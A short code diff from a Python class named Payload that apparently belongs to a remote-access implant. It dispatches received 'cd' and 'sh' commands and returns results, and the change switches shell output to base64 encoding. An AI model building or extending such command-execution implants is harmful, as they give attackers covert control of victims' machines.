@@ -40,7 +40,7 @@ class Payload(object):
 			cmd['res'] = utils.cd(cmd['dir'])
 			return cmd
 		elif cmd['type'] == "sh":
-			cmd['res'] = utils.force_decode(utils.sh(cmd['cmd']))
+			cmd['res'] = utils.b64e(utils.sh(cmd['cmd']))
 			return cmd
 		# elif cmd['type'] == "exec":
 		# 	exec(cmd['cmd'])
